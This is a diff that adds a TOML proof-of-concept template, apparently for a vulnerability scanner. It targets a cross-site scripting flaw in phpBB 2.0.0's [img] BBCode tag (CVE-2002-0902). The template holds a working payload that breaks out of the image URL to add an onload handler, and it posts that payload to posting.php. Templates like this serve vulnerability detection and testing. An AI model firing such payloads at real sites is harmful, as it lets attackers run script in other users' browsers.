@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = '检测phpBB 2.0.0中[IMG]标签的XSS注入漏洞。通过在帖子中插入特制BBCode [img]http://x.com/x" onload="alert(1)"[/img]，可绕过安全检查注入任意JavaScript。'
+id = "POC-AVE-2002-0468"
+name = "phpBB 2.0.0 IMG标签XSS注入 PoC"
+severity = "high"
+tags = ["cve-2002-0902"]
+vuln_id = [
+    "CVE-2002-0902",
+    "AVE-2002-0468",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/posting.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "subject=Test&message=%5Bimg%5Dhttp%3A%2F%2Fx.com%2Fx%22+onload%3D%22alert%281%29%22%5B%2Fimg%5D&submit=Submit"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "message",
+    "posted",
+]
